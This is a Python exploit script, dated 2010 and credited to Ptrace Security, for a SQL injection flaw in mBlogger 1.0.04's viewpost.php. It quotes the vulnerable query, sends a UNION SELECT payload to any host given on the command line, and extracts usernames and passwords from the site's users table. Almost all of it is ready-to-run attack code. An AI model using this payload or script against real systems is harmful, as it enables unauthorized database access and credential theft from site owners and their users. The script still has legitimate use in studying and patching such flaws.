#!/usr/bin/python
#
# Exploit Title:   mBlogger v1.0.04 (viewpost.php) SQL Injection Exploit
# Date         :   31 August 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/mblogger/
# Version      :   1.0.04
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + viewpost.php => SQL Injection!!
#
# 30: $query = "SELECT id, name, subject, message, posted FROM posts WHERE
#     id = '$_GET[postID]'";
# 31: $result = mysql_query($query) or die(mysql_error());
# 32: while($row = mysql_fetch_array($result, MYSQL_ASSOC))
# 33: {
# 34: 	echo "<div class='posttitle'>";
# 35: 	echo "<h3>" . $row['subject'] . "</h3>";
# 36: 	echo "</div>";
# 37: 	echo "<div class='postbody'>";
# 38: 	echo "<p> Posted by: " . $row['name'] . " on " . $row['posted'] . "</p>";
# 39: 	echo "<p>" . $row['message'] . "</p>";
# 40: 	echo "</div>";
# 41: 	$postID = $row['id'];
# 42: }
#

import re
import sys
import http.client


def usage(prog):
    print('Usage  : ' + prog + ' <target> <path>\n')
    print('Example: ' + prog + ' localhost /mBlogger/')
    print('         ' + prog + ' www.target.com /complet/path/')
    return


def exploit(target, path):
    payload  = 'viewpost.php?postID=-1%27%20UNION%20SELECT%201,%27h4x0r%27,%27'
    payload += 'credentials%27,CONCAT(%27%3C1%3E%27,username,%27:%27,password,'
    payload += '%27%3C2%3E%27),%20NULL%20FROM%20users%20--%20%27'

    print('[+] Sending HTTP Request')
    con = http.client.HTTPConnection(target)
    con.request('GET', path + payload)
    res = con.getresponse()

    if res.status != 200:
        print('[!] HTTP GET Request Failed')
        exit(1)

    print('[+] Parsing HTTP Response')
    data = res.read().decode()
    pattern = re.compile(r"<1>(.+?)<2>", re.M)
    
    print('[+] Information Extracted:\n') 
    credentials = pattern.findall(data)
    for element in credentials:
        print(element)
    
    return



print('\n+-----------------------------------------------------------------------------+')
print('| mBlogger v1.0.04 (viewpost.php) SQL Injection Exploit by Ptrace Security    |')
print('+-----------------------------------------------------------------------------+\n')

if len(sys.argv) != 3:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2])

exit(0)